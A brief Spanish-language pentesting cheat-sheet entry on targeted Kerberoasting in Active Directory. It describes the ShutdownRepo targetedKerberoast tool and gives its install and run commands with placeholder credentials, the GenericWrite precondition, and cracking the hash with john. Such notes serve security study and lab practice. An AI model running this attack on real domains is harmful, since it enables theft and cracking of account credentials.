# Target Kerberoast 

Tags: #AD #Kali 

Es una herramienta que **asigna temporalmente un SPN** a una cuenta de usuario **controlada por el atacante**, para después **solicitar un TGS** y obtener su **hash crackeable**.

```bash 
❯ git clone https://github.com/ShutdownRepo/targetedKerberoast    # Clonar para obtener la tool 

❯ pip3 install -r requirements.txt --break-system-packages
```

```bash 
❯ python3 targetedkerberoast.py -u 'user' -p 'passwd' -d domain.corp --dc-ip IP 

Notas:
	1. Este ataque funciona si el usuario del cual tenemos las credenciales tiene los derechos de 'Generic Write' sobre el otro usuario  
	2. Despues de obtener el hash, crackearlo con la herramineta john 
```